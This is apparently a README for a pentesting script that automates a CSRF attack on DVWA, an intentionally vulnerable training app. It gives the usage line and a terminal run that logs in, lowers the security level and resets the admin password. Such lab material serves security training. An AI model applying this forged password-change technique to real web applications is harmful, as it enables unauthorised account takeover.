          
		  Hi guys, this tool is to automate the Cross Site Request Forgery for DVWA script.

		  Notice, that you have to add the IP, Password and Level, don't forget to choose one of 

		  these levels to accomplish the process:

		  ("high", "medium", "low").

		  here is an examples from my terminal :

		  xakep@pentester:~/Desktop/myscripts/owasp/web-vulns/csrf$ python csrf.py

			[!] Usage: [IP] [Password] [Level]
			[!] The default password for the first time is: password

		  xakep@pentester:~/Desktop/myscripts/owasp/web-vulns/csrf$ python csrf.py 192.168.43.2 password low

			   ______     ____        ___    
			  |  _ \ \   / /\ \      / / \   
			  | | | \ \ / /  \ \ /\ / / _ \  
			  | |_| |\ V /    \ V  V / ___ \ 
			  |____/  \_/      \_/\_/_/   \_\

			  ____ ____  ____  _____ 
			 / ___/ ___||  _ \|  ___|
			| |   \___ \| |_) | |_   
			| |___ ___) |  _ <|  _|  
			 \____|____/|_| \_\_| 

			  Author: Reznov - Pentester and hacker
			  Website: http://xakepu.blogspot.com
			  Github: https://github.com/reznov11
			  Twitter: @pentester11  

		[--] http://192.168.43.2/dvwa/login.php, Response: 200

		[*] Damn Vulnerable Web App (DVWA) v1.8 :: Welcome

		[?] Enter the security panel

		[!] You're inside the security panel > Damn Vulnerable Web App (DVWA) v1.8 :: DVWA Security

		[+] Now change the security level to low

		[*] Security now is: low

		[+] Now lets change the password for admin

		[!] Current password is: password

		[>] New Password: 123456

		[>] Confirm Password: 123456

		[--] Now wait to submit ...

		[*] Thats it you can login with the new password: 123456

		[*] Finished at 2015 17:35:21
